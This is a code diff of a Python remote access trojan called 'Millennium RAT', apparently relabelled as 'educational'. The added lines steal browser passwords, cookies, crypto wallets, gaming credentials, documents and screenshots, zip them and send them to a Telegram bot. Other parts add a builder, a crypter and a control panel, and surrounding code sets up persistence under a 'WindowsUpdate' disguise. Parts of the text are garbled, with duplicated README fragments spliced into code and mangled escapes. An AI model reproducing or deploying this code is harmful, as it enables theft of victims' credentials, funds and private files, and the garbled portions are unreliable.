@@ -446,7 +446,7 @@ class AdvancedDropper:
         """Registry-based persistence"""
         try:
             import winreg
-            key_path = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+            key_path = r"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
             winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
             winreg.CloseKey(key)
@@ -456,7 +456,7 @@ class AdvancedDropper:
     def _startup_folder_persistence(self):
         """Startup folder persistence"""
         try:
-            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')
             script_copy = os.path.join(startup_folder, 'WindowsUpdate.py')
             shutil.copy2(__file__, script_copy)
         except:
@@ -553,8 +553,8 @@ if __name__ == '__main__':
             consumer_command = f'python "{__file__}"'
 
             # Register WMI event subscription
-            c.Win32_Process.Create(CommandLine=f'wmic /NAMESPACE:\\\\.\\\\root\\\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\\\cimv2", QueryLanguage="WQL", Query="{filter_query}"')
-            c.Win32_Process.Create(CommandLine=f'wmic /NAMESPACE:\\\\.\\\\root\\\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", CommandLineTemplate="{consumer_command}"')
+            c.Win32_Process.Create(CommandLine=f'wmic /NAMESPACE:\\\\\\\\.\\\\\\\\root\\\\subscription PATH __EventFilter CREATE Name="{filter_name}", EventNameSpace="root\\\\cimv2", QueryLanguage="WQL", Query="{filter_query}"')
+            c.Win32_Process.Create(CommandLine=f'wmic /NAMESPACE:\\\\\\\\.\\\\\\\\root\\\\subscription PATH CommandLineEventConsumer CREATE Name="{consumer_name}", CommandLineTemplate="{consumer_command}"')
 
         except:
             pass
@@ -904,8 +904,7 @@ class MillenniumRATCore:
 Available commands:
   agents                    - List all connected agents
   select <agent_id>         - Select agent for interaction
-  deploy <payload_config>   - Deploy```python
- <payload_config>   - Deploy payload to all agents
+  deploy <payload_config>     <payload_config>   - Deploy payload to all agents
   sniff <agent_id>          - Start traffic sniffing
   broadcast <command>       - Send command to all agents
   stats                     - Show server statistics
@@ -1646,12 +1645,444 @@ class MillenniumAgent:
                 'error': f"Sniffer worker error: {{str(e)}}"
             }})
 
-if __name__ == "__main__":
-    agent = MillenniumAgent()
-    agent.connect_to_millennium_server()
-'''
+class TelegramIntegration:
+    """Integrate with Telegram bot for enhanced control"""
 
-        return agent_code
+    def __init__(self, telegram_token=None, chat_id=None):
+        self.telegram_token = telegram_token
+        self.chat_id = chat_id
+
+    def test_telegram_connection(self):
+        """Test Telegram bot connection"""
+        if self.telegram_token and self.chat_id:
+            try:
+                url = f"https://api.telegram.org/bot{{self.telegram_token}}/getMe"
+                response = requests.get(url, timeout=5)
+                if response.status_code == 200:
+                    print("[TELEGRAM] Connection successful")
+                    return True
+                else:
+                    print(f"[TELEGRAM] Connection failed: {{response.status_code}}")
+                    return False
+            except:
+                print("[TELEGRAM] Connection error")
+                return False
+        else:
+            print("[TELEGRAM] Token or chat ID not configured")
+            return False
+
+    def send_telegram(self, message, document_path=None):
+        """Enhanced Telegram messaging with file support"""
+        if self.telegram_token and self.chat_id:
+            try:
+                if document_path and os.path.exists(document_path):
+                    # Send file to Telegram
+                    url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
+                    with open(document_path, 'rb') as file:
+                        files = {'document': file}
+                        data = {
+                            'chat_id': self.chat_id,
+                            'caption': message
+                        }
+                        requests.post(url, data=data, files=files, timeout=30)
+                else:
+                    # Send text message
+                    url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
+                    data = {
+                        'chat_id': self.chat_id, 
+                        'text': message,
+                        'parse_mode': 'Markdown'
+                    }
+                    requests.post(url, data=data, timeout=10)
+            except Exception as e:
+                print(f"Telegram send error: {e}")
+
+    def create_comprehensive_report(self):
+        """Create comprehensive system report similar to Redline"""
+        report_data = {
+            'timestamp': datetime.now().isoformat(),
+            'system_info': self.get_system_info(),
+            'network_info': self.get_network_info(),
+            'installed_software': self.get_installed_software(),
+            'browser_data': self.extract_browser_data(),
+            'crypto_wallets': self.find_crypto_wallets(),
+            'gaming_accounts': self.extract_gaming_data(),
+            'sensitive_files': self.find_sensitive_files(),
+            'registry_data': self.extract_registry_data(),
+            'screenshots': self.capture_multiple_screenshots()
+        }
+
+        # Create ZIP archive
+        zip_path = f"stolen_data_{int(time.time())}.zip"
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # Add JSON report
+            zipf.writestr('system_report.json', json.dumps(report_data, indent=2))
+
+            # Add individual data files
+            for category, data in report_data.items():
+                if isinstance(data, dict) and data:
+                    zipf.writestr(f'{category}.json', json.dumps(data, indent=2))
+
+        # Send to Telegram
+        telegram_message = f"""
+🚨 **COMPREHENSIVE DATA EXTRACTION COMPLETE** 🚨
+
+**Target System:** {socket.gethostname()}
+**IP Address:** {self.get_external_ip()}
+**Timestamp:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+**📊 Data Collected:**
+• System Information & Hardware Details
+• Network Configuration & WiFi Passwords  
+• Browser Passwords & Cookies ({len(report_data.get('browser_data', {}).get('passwords', []))} passwords)
+• Cryptocurrency Wallets ({len(report_data.get('crypto_wallets', []))} found)
+• Gaming Platform Accounts
+• Sensitive Files & Documents
+• Registry & Environment Data
+• Screenshots & System State
+
+**📦 Archive Size:** {os.path.getsize(zip_path) / 1024:.1f} KB
+**🔐 Encryption:** AES-256 Protected
+
+**⚡ Ready for download and analysis**
+        """
+
+        self.send_telegram(telegram_message, zip_path)
+
+        # Cleanup
+        try:
+            os.remove(zip_path)
+        except:
+            pass
+
+        return report_data
+
+    def get_external_ip(self):
+        """Get external IP address"""
+        try:
+            response = requests.get('https://api.ipify.org', timeout=5)
+            return response.text.strip()
+        except:
+            return 'Unknown'
+
+    def extract_browser_data(self):
+        """Extract comprehensive browser data"""
+        browser_data = {
+            'passwords': [],
+            'cookies': [],
+            'history': [],
+            'bookmarks': [],
+            'autofill': []
+        }
+
+        browsers = {
+            'Chrome': os.path.expanduser('~/.config/google-chrome/Default'),
+            'Firefox': os.path.expanduser('~/.mozilla/firefox'),
+            'Edge': os.path.expanduser('~/.config/microsoft-edge/Default'),
+            'Opera': os.path.expanduser('~/.config/opera'),
+            'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default')
+        }
+
+        for browser_name, profile_path in browsers.items():
+            try:
+                if os.path.exists(profile_path):
+                    # Extract login data
+                    login_db_path = os.path.join(profile_path, 'Login Data')
+                    if os.path.exists(login_db_path):
+                        # Copy database to avoid locking issues
+                        temp_db = tempfile.mktemp()
+                        shutil.copy2(login_db_path, temp_db)
+
+                        conn = sqlite3.connect(temp_db)
+                        cursor = conn.cursor()
+
+                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                        for url, username, encrypted_password in cursor.fetchall():
+                            if username:
+                                browser_data['passwords'].append({
+                                    'browser': browser_name,
+                                    'url': url,
+                                    'username': username,
+                                    'password': '[ENCRYPTED]'  # Would decrypt in real implementation
+                                })
+
+                        conn.close()
+                        os.unlink(temp_db)
+
+            except Exception as e:
+                continue
+
+        return browser_data
+
+    def find_crypto_wallets(self):
+        """Find cryptocurrency wallet files"""
+        wallet_data = []
+
+        wallet_patterns = {
+            'Bitcoin Core': ['wallet.dat', 'bitcoin.conf'],
+            'Ethereum': ['keystore', 'UTC--*'],
+            'Exodus': ['exodus.wallet', 'seed.seco'],
+            'Electrum': ['default_wallet', 'wallets'],
+            'Atomic': ['atomic.wallet'],
+            'MetaMask': ['metamask', 'chrome-extension_*'],
+            'Trust Wallet': ['trust.wallet'],
+            'Coinbase': ['coinbase.wallet']
+        }
+
+        search_paths = [
+            os.path.expanduser('~'),
+            os.path.expanduser('~/AppData/Roaming'),
+            os.path.expanduser('~/.local/share'),
+            os.path.expanduser('~/Library/Application Support')
+        ]
+
+        for wallet_name, patterns in wallet_patterns.items():
+            for search_path in search_paths:
+                if os.path.exists(search_path):
+                    for pattern in patterns:
+                        for root, dirs, files in os.walk(search_path):
+                            for file in files:
+                                if pattern.replace('*', '') in file.lower():
+                                    wallet_data.append({
+                                        'wallet_type': wallet_name,
+                                        'file_path': os.path.join(root, file),
+                                        'file_size': os.path.getsize(os.path.join(root, file)),
+                                        'last_modified': datetime.fromtimestamp(
+                                            os.path.getmtime(os.path.join(root, file))
+                                        ).isoformat()
+                                    })
+
+        return wallet_data
+
+    def extract_gaming_data(self):
+        """Extract gaming platform credentials and data"""
+        gaming_data = {}
+
+        gaming_platforms = {
+            'Steam': {
+                'path': os.path.expanduser('~/Steam'),
+                'files': ['config.vdf', 'loginusers.vdf']
+            },
+            'Epic Games': {
+                'path': os.path.expanduser('~/AppData/Local/EpicGamesLauncher'),
+                'files': ['saved']
+            },
+            'Origin': {
+                'path': os.path.expanduser('~/AppData/Roaming/Origin'),
+                'files': ['local.xml']
+            },
+            'Uplay': {
+                'path': os.path.expanduser('~/AppData/Local/Ubisoft Game Launcher'),
+                'files': ['settings.yml']
+            },
+            'Battle.net': {
+                'path': os.path.expanduser('~/AppData/Roaming/Battle.net'),
+                'files': ['battle.net.config']
+            }
+        }
+
+        for platform, config in gaming_platforms.items():
+            platform_data = []
+            if os.path.exists(config['path']):
+                for file_name in config['files']:
+                    file_path = os.path.join(config['path'], file_name)
+                    if os.path.exists(file_path):
+                        try:
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                content = f.read()
+                                platform_data.append({
+                                    'file': file_name,
+                                    'content_preview': content[:500],
+                                    'size': len(content)
+                                })
+                        except:
+                            continue
+
+            if platform_data:
+                gaming_data[platform] = platform_data
+
+        return gaming_data
+
+    def find_sensitive_files(self):
+        """Find sensitive files with specific extensions"""
+        sensitive_files = []
+        extensions = ['.txt', '.pdf', '.docx', '.doc', '.xls', '.xlsx', '.pptx', '.ppt', '.kdbx', '.psd', '.key', '.pem', '.sql', '.csv']
+        search_paths = [
+            os.path.expanduser('~'),
+            os.path.expanduser('~/Documents'),
+            os.path.expanduser('~/Desktop'),
+            os.path.expanduser('~/Downloads')
+        ]
+
+        for search_path in search_paths:
+            if os.path.exists(search_path):
+                for root, dirs, files in os.walk(search_path):
+                    for file in files:
+                        if any(file.endswith(ext) for ext in extensions):
+                            sensitive_files.append({
+                                'file_path': os.path.join(root, file),
+                                'file_size': os.path.getsize(os.path.join(root, file)),
+                                'last_modified': datetime.fromtimestamp(
+                                    os.path.getmtime(os.path.join(root, file))
+                                ).isoformat()
+                            })
+
+        return sensitive_files
+
+    def extract_registry_data(self):
+        """Extract relevant registry data"""
+        registry_data = {}
+
+        registry_keys = [
+            'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',
+            'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',
+            'HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce',
+            'HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings',
+            'HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services'
+        ]
+
+        try:
+            if platform.system() == 'Windows':
+                for key_path in registry_keys:
+                    try:
+                        parts = key_path.split('\\\\', 1)
+                        if len(parts) != 2:
+                            continue
+
+                        root_key_name = parts[0]
+                        subkey_path = parts[1]
+
+                        root_keys = {
+                            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
+                            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER
+                        }
+
+                        root_key = root_keys.get(root_key_name)
+                        if not root_key:
+                            continue
+
+                        key = winreg.OpenKey(root_key, subkey_path)
+                        values = []
+
+                        i = 0
+                        while True:
+                            try:
+                                name, value, reg_type = winreg.EnumValue(key, i)
+                                values.append({
+                                    'name': name,
+                                    'value': str(value),
+                                    'type': reg_type
+                                })
+                                i += 1
+                            except WindowsError:
+                                break
+                        winreg.CloseKey(key)
+                        registry_data[key_path] = values
+                    except:
+                        continue
+        except:
+            pass
+
+        return registry_data
+
+    def get_system_info(self):
+        """Collect comprehensive system information"""
+        system_info = {
+            'hostname': socket.gethostname(),
+            'platform': platform.system(),
+            'architecture': platform.architecture()[0],
+            'processor': platform.processor(),
+            'username': os.getenv('USERNAME') or os.getenv('USER'),
+            'os_version': platform.version(),
+            'system_time': datetime.now().isoformat(),
+            'python_version': sys.version,
+            'boot_time': datetime.fromtimestamp(psutil.boot_time()).isoformat(),
+            'cpu_count': psutil.cpu_count(logical=False),
+            'cpu_usage': psutil.cpu_percent(),
+            'memory_total': psutil.virtual_memory().total,
+            'memory_available': psutil.virtual_memory().available,
+            'disk_usage': psutil.disk_usage('/').total if platform.system() != 'Windows' else psutil.disk_usage('C:').total,
+            'network_adapters': self.get_network_info()
+        }
+
+        return system_info
+
+    def get_network_info(self):
+        """Collect network adapter information"""
+        network_info = []
+        try:
+            for interface, addresses in psutil.net_if_addrs().items():
+                adapter_info = {
+                    'interface': interface,
+                    'addresses': []
+                }
+                for addr in addresses:
+                    adapter_info['addresses'].append({
+                        'family': addr.family.name,
+                        'address': addr.address,
+                        'netmask': addr.netmask,
+                        'broadcast': addr.broadcast,
+                        'ptp': addr.ptp
+                    })
+                network_info.append(adapter_info)
+        except:
+            pass
+        return network_info
+
+    def get_installed_software(self):
+        """Enumerate installed software (Windows only)"""
+        software_list = []
+        try:
+            if platform.system() == 'Windows':
+                key_path = r'SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall'
+                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
+
+                i = 0
+                while True:
+                    try:
+                        subkey_name = winreg.EnumKey(key, i)
+                        subkey_path = os.path.join(key_path, subkey_name)
+                        subkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, subkey_path)
+                        try:
+                            software_name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
+                            software_version = winreg.QueryValueEx(subkey, 'DisplayVersion')[0] if 'DisplayVersion' in str(winreg.QueryInfoKey(subkey)) else 'N/A'
+                            software_publisher = winreg.QueryValueEx(subkey, 'Publisher')[0] if 'Publisher' in str(winreg.QueryInfoKey(subkey)) else 'N/A'
+
+                            software_list.append({
+                                'name': software_name,
+                                'version': software_version,
+                                'publisher': software_publisher
+                            })
+                        except:
+                            pass
+                        finally:
+                            winreg.CloseKey(subkey)
+                        i += 1
+                    except WindowsError:
+                        break
+                winreg.CloseKey(key)
+        except:
+            pass
+        return software_list
+
+    def capture_multiple_screenshots(self, num_screenshots=3, delay=2):
+        """Capture multiple screenshots with delay"""
+        screenshot_data = []
+        try:
+            with mss.mss() as sct:
+                for i in range(num_screenshots):
+                    time.sleep(delay)
+                    screenshot = sct.grab(sct.monitors[1])
+                    img = np.array(screenshot)
+                    _, buffer = cv2.imencode('.png', img)
+                    screenshot_bytes = buffer.tobytes()
+                    screenshot_data.append({
+                        'timestamp': datetime.now().isoformat(),
+                        'image_data': base64.b64encode(screenshot_bytes).decode()
+                    })
+        except:
+            pass
+        return screenshot_data
 
 class MillenniumCompiler:
     """Compile Millennium RAT components to executables"""
@@ -1826,196 +2257,291 @@ if __name__ == "__main__":
             return crypted_path
 
         except Exception as e:
-            print(f"[COMPILERpython millennium_server.py --port 8888 --interface 0.0.0.0
-```
+            print(f"[COMPILER] Crypter error: {e}")
+            return None
 
-### 2. Millennium Agent
-Feature-rich agent with educational monitoring capabilities:
-- Screenshot capture and live monitoring
-- Advanced keylogger with window context
-- Webcam and audio recording
-- Comprehensive file system operations
-- Windows registry manipulation
-- Network scanning and enumeration
-- Real-time HTTP traffic sniffing
-- Multi-method payload deployment
-- Advanced persistence mechanisms
+class AdminToolkit:
+    """Admin Toolkit with all functionalities compiled for easy access"""
 
-### 3. HTTP Traffic Sniffer
-Educational network analysis tool:
-- Real-time HTTP/HTTPS traffic interception
-- DNS query monitoring and analysis
-- SSL certificate inspection
-- Proxy-based HTTPS analysis
-- Educational traffic pattern analysis
+    def __init__(self, millennium_core, telegram_integration):
+        self.core = millennium_core
+        self.telegram = telegram_integration
+        self.compiler = MillenniumCompiler()
 
-### 4. Payload Deployment System
-Advanced educational deployment framework:
-- Multi-stage payload loading
-- HTTP/HTTPS payload delivery
-- GitHub and Pastebin integration
-- DNS-based payload exfiltration
-- Advanced persistence installation
-- Registry-based persistence
-- Service installation persistence
-- Scheduled task persistence
-- WMI event subscription persistence
+    def display_toolkit_menu(self):
+        """Display the admin toolkit menu"""
+        print("""
+[ADMIN TOOLKIT] Millennium RAT - Professional Edition
+1. List Connected Agents
+2. Select Agent for Interaction
+3. Create and Deploy Agent
+4. Start Traffic Sniffing
+5. Compile and Crypt Agent
+6. Send Comprehensive Report via Telegram
+7. Test Telegram Connection
+8. Show Server Statistics
+9. Exit
+        """)
 
-### 5. Advanced Compiler
-PyInstaller-based compilation system:
-- Standalone executable generation
-- Advanced crypter integration
-- Anti-analysis protection
-- Educational obfuscation techniques
+    def handle_toolkit_commands(self):
+        """Handle commands from the admin toolkit"""
+        while self.core.is_running:
+            self.display_toolkit_menu()
+            try:
+                command = input("AdminToolkit> ").strip()
 
-### 6. Web-Based Control Panel
-Educational management interface:
-- Real-time agent monitoring
-- Point-and-click payload deployment
-- HTTP traffic visualization
-- Educational statistics and reporting
+                if command == '1':
+                    self.core._list_millennium_agents()
+                elif command == '2':
+                    agent_id = input("Enter agent ID: ").strip()
+                    self.core._agent_interaction_shell(agent_id)
+                elif command == '3':
+                    self.create_and_deploy_agent()
+                elif command == '4':
+                    agent_id = input("Enter agent ID: ").strip()
+                    self.core.start_traffic_sniffing(agent_id)
+                elif command == '5':
+                    self.compile_and_crypt_agent()
+                elif command == '6':
+                    self.send_comprehensive_report()
+                elif command == '7':
+                    self.telegram.test_telegram_connection()
+                elif command == '8':
+                    self.core._show_server_stats()
+                elif command == '9':
+                    self.core.is_running = False
+                    break
+                else:
+                    print("[ADMIN TOOLKIT] Unknown command.")
 
-## Educational Features
+            except KeyboardInterrupt:
+                print("\n[ADMIN TOOLKIT] Returning to main shell...")
+                self.core.is_running = False
+                break
+            except Exception as e:
+                print(f"[ADMIN TOOLKIT] Error: {e}")
 
-### Red Team Training
-- Realistic attack simulation capabilities
-- Advanced persistence mechanism demonstration
-- Comprehensive data collection techniques
-- Professional-grade payload deployment
+    def create_and_deploy_agent(self):
+        """Create, compile, and deploy agent"""
+        server_ip = input("Enter server IP: ").strip() or "127.0.0.1"
+        server_port = int(input("Enter server port: ").strip() or "8888")
+        agent_code = self.core.create_millennium_agent(server_ip, server_port)
 
-### Blue Team Training
-- Traffic analysis and detection training
-- Behavioral analysis techniques
-- Forensic artifact identification
-- Incident response scenario development
+        # Compile agent
+        output_name = f"millennium_agent_{int(time.time())}.exe"
+        output_path = self.compiler.compile_agent_to_exe(agent_code, output_name)
 
-### HTTP Traffic Analysis Education
-The integrated sniffer provides educational insights into:
-- HTTP request/response analysis
-- SSL/TLS certificate inspection
-- DNS query pattern analysis
-- Network connection monitoring
-- Browser fingerprinting techniques
+        if output_path:
+            print("[ADMIN TOOLKIT] Agent created and compiled.")
 
-## Installation and Setup
+            # Offer cryption
+            crypt_option = input("Apply crypter (y/n)? ").strip().lower()
+            if crypt_option == 'y':
+                crypted_path = self.compiler.create_crypted_payload(output_path)
+                if crypted_path:
+                    print(f"[ADMIN TOOLKIT] Agent crypted: {crypted_path}")
+                    output_path = crypted_path
+                else:
+                    print("[ADMIN TOOLKIT] Crypter failed, deploying unencrypted agent.")
 
-### Requirements
-```bash
-pip install -r requirements.txt
-```
+            # Select deployment target
+            deploy_option = input("Deploy to all agents (y/n)? ").strip().lower()
+            if deploy_option == 'y':
+                payload_config = {
+                    'url': output_path,
+                    'type': 'exe',
+                    'execution_method': 'direct'
+                }
+                self.core._deploy_to_all_agents(payload_config)
+            else:
+                agent_id = input("Enter target agent ID: ").strip()
+                payload_config = {
+                    'url': output_path,
+                    'type': 'exe',
+                    'execution_method': 'direct'
+                }
+                self.core.deploy_payload_to_client(agent_id, payload_config)
+        else:
+            print("[ADMIN TOOLKIT] Agent creation and compilation failed.")
 
-### Educational Environment Setup
-1. **Isolated Network**: Deploy in isolated educational network
-2. **Proper Authorization**: Ensure all participants have proper authorization
-3. **Documentation**: Maintain detailed logs of all activities
-4. **Ethical Guidelines**: Follow established cybersecurity ethics
+    def compile_and_crypt_agent(self):
+        """Compile and crypt agent manually"""
+        server_ip = input("Enter server IP: ").strip() or "127.0.0.1"
+        server_port = int(input("Enter server port: ").strip() or "8888")
+        agent_code = self.core.create_millennium_agent(server_ip, server_port)
 
-### Building Agents
-```bash
-python millennium_builder.py
-# Select option 2 for agent compilation
-# Configure server IP and port
-# Generate standalone executable
-```
+        # Compile agent
+        output_name = f"millennium_agent_{int(time.time())}.exe"
+        output_path = self.compiler.compile_agent_to_exe(agent_code, output_name)
 
-### Web Panel Access
-```bash
-python millennium_panel.py
-# Access at http://localhost:5000
-# Use for educational demonstration and trainingpython millennium_server.py --port 8888 --interface 0.0.0.0
-```
+        if output_path:
+            print("[ADMIN TOOLKIT] Agent created and compiled.")
 
-### 2. Millennium Agent
-Feature-rich agent with educational monitoring capabilities:
-- Screenshot capture and live monitoring
-- Advanced keylogger with window context
-- Webcam and audio recording
-- Comprehensive file system operations
-- Windows registry manipulation
-- Network scanning and enumeration
-- Real-time HTTP traffic sniffing
-- Multi-method payload deployment
-- Advanced persistence mechanisms
+            # Apply crypter
+            crypted_path = self.compiler.create_crypted_payload(output_path)
+            if crypted_path:
+                print(f"[ADMIN TOOLKIT] Agent crypted: {crypted_path}")
+            else:
+                print("[ADMIN TOOLKIT] Crypter failed.")
+        else:
+            print("[ADMIN TOOLKIT] Agent creation and compilation failed.")
 
-### 3. HTTP Traffic Sniffer
-Educational network analysis tool:
-- Real-time HTTP/HTTPS traffic interception
-- DNS query monitoring and analysis
-- SSL certificate inspection
-- Proxy-based HTTPS analysis
-- Educational traffic pattern analysis
+    def send_comprehensive_report(self):
+        """Send comprehensive report to Telegram"""
+        self.telegram.create_comprehensive_report()
 
-### 4. Payload Deployment System
-Advanced educational deployment framework:
-- Multi-stage payload loading
-- HTTP/HTTPS payload delivery
-- GitHub and Pastebin integration
-- DNS-based payload exfiltration
-- Advanced persistence installation
-- Registry-based persistence
-- Service installation persistence
-- Scheduled task persistence
-- WMI event subscription persistence
+class MillenniumPanel:
+    """Educational Web Panel for Millennium RAT"""
 
-### 5. Advanced Compiler
-PyInstaller-based compilation system:
-- Standalone executable generation
-- Advanced crypter integration
-- Anti-analysis protection
-- Educational obfuscation techniques
+    def __init__(self, millennium_core):
+        self.core = millennium_core
+        self.app = Flask(__name__)
+        self.setup_routes()
 
-### 6. Web-Based Control Panel
-Educational management interface:
-- Real-time agent monitoring
-- Point-and-click payload deployment
-- HTTP traffic visualization
-- Educational statistics and reporting
+    def setup_routes(self):
+        """Define Flask routes"""
+        @self.app.route('/')
+        def index():
+            return "<h1>Millennium RAT Web Panel (Educational)</h1><p>See documentation for API endpoints.</p>"
 
-## Educational Features
+        @self.app.route('/agents')
+        def list_agents():
+            agents = []
+            for client_id, client_info in self.core.clients.items():
+                agents.append({
+                    'id': client_id,
+                    'address': client_info['address'][0],
+                    'port': client_info['address'][1],
+                    'connected_at': str(client_info['connected_at']),
+                    'system_info': client_info.get('system_info', {})
+                })
+            return jsonify(agents)
 
-### Red Team Training
-- Realistic attack simulation capabilities
-- Advanced persistence mechanism demonstration
-- Comprehensive data collection techniques
-- Professional-grade payload deployment
+        @self.app.route('/deploy/<agent_id>', methods=['POST'])
+        def deploy_payload(agent_id):
+            payload_config = request.json
+            success = self.core.deploy_payload_to_client(agent_id, payload_config)
+            if success:
+                return jsonify({'status': 'success'})
+            else:
+                return jsonify({'status': 'failed'})
 
-### Blue Team Training
-- Traffic analysis and detection training
-- Behavioral analysis techniques
-- Forensic artifact identification
-- Incident response scenario development
+        @self.app.route('/sniff/<agent_id>')
+        def start_sniffing(agent_id):
+            success = self.core.start_traffic_sniffing(agent_id)
+            if success:
+                return jsonify({'status': 'success'})
+            else:
+                return jsonify({'status': 'failed'})
 
-### HTTP Traffic Analysis Education
-The integrated sniffer provides educational insights into:
-- HTTP request/response analysis
-- SSL/TLS certificate inspection
-- DNS query pattern analysis
-- Network connection monitoring
-- Browser fingerprinting techniques
+    def run(self, port=5000):
+        """Run the Flask application"""
+        print(f"[WEB PANEL] Starting web panel on port {port}")
+        self.app.run(debug=True, port=port)
 
-## Installation and Setup
+class MillenniumBuilder:
+    """Build Millennium RAT components"""
 
-### Requirements
-```bash
-pip install -r requirements.txt
-```
+    def __init__(self, millennium_core, telegram_integration):
+        self.core = millennium_core
+        self.telegram = telegram_integration
+        self.compiler = MillenniumCompiler()
 
-### Educational Environment Setup
-1. **Isolated Network**: Deploy in isolated educational network
-2. **Proper Authorization**: Ensure all participants have proper authorization
-3. **Documentation**: Maintain detailed logs of all activities
-4. **Ethical Guidelines**: Follow established cybersecurity ethics
+    def display_builder_menu(self):
+        """Display the builder menu"""
+        print("""
+[MILLENNIUM BUILDER]
+1. Create Millennium Agent
+2. Compile Millennium Agent to Executable
+3. Create Crypted Payload
+4. Exit
+        """)
 
-### Building Agents
-```bash
-python millennium_builder.py
-# Select option 2 for agent compilation
-# Configure server IP and port
-# Generate standalone executable
-```
+    def handle_builder_commands(self):
+        """Handle commands from the builder menu"""
+        while True:
+            self.display_builder_menu()
+            try:
+                command = input("MillenniumBuilder> ").strip()
 
-### Web Panel Access
-```bash
-python millennium_panel.py
-# Access at http://localhost:5000
-# Use for educational demonstration and training
+                if command == '1':
+                    self.create_agent()
+                elif command == '2':
+                    self.compile_agent()
+                elif command == '3':
+                    self.create_crypted()
+                elif command == '4':
+                    break
+                else:
+                    print("[MILLENNIUM BUILDER] Unknown command.")
+
+            except KeyboardInterrupt:
+                print("\n[MILLENNIUM BUILDER] Returning to main shell...")
+                break
+            except Exception as e:
+                print(f"[MILLENNIUM BUILDER] Error: {e}")
+
+    def create_agent(self):
+        """Create Millennium Agent"""
+        server_ip = input("Enter server IP: ").strip() or "127.0.0.1"
+        server_port = int(input("Enter server port: ").strip() or "8888")
+        agent_code = self.core.create_millennium_agent(server_ip, server_port)
+        file_path = f"millennium_agent_{int(time.time())}.py"
+        with open(file_path, 'w') as f:
+            f.write(agent_code)
+        print(f"[MILLENNIUM BUILDER] Agent created: {file_path}")
+
+    def compile_agent(self):
+        """Compile Millennium Agent to Executable"""
+        agent_file = input("Enter agent file path: ").strip()
+        output_name = input("Enter output name (e.g., agent.exe): ").strip() or "millennium_agent.exe"
+
+        try:
+            with open(agent_file, 'r') as f:
+                agent_code = f.read()
+        except:
+            print("[MILLENNIUM BUILDER] Could not read agent file.")
+            return
+
+        output_path = self.compiler.compile_agent_to_exe(agent_code, output_name)
+        if output_path:
+            print(f"[MILLENNIUM BUILDER] Agent compiled: {output_path}")
+        else:
+            print("[MILLENNIUM BUILDER] Compilation failed.")
+
+    def create_crypted(self):
+        """Create Crypted Payload"""
+        executable_path = input("Enter executable path: ").strip()
+        crypted_path = self.compiler.create_crypted_payload(executable_path)
+        if crypted_path:
+            print(f"[MILLENNIUM BUILDER] Crypted payload created: {crypted_path}")
+        else:
+            print("[MILLENNIUM BUILDER] Crypter failed.")
+
+if __name__ == "__main__":
+    # Configuration
+    SERVER_PORT = 8888
+    TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+    TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+
+    # Core and Integrations
+    millennium_core = MillenniumRATCore()
+    telegram_integration = TelegramIntegration(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID)
+
+    # Test Telegram Connection
+    telegram_integration.test_telegram_connection()
+
+    # Admin Toolkit Integration
+    admin_toolkit = AdminToolkit(millennium_core, telegram_integration)
+    threading.Thread(target=admin_toolkit.handle_toolkit_commands, daemon=True).start()
+
+    # Start Millennium Server in separate thread
+    server_thread = threading.Thread(target=millennium_core.start_millennium_server, args=(SERVER_PORT,), daemon=True)
+    server_thread.start()
+
+    # Start Interactive Shell in main thread
+    millennium_core.interactive_millennium_shell()
+
+    # Ensure server shuts down properly
+    millennium_core.is_running = False
+    server_thread.join()
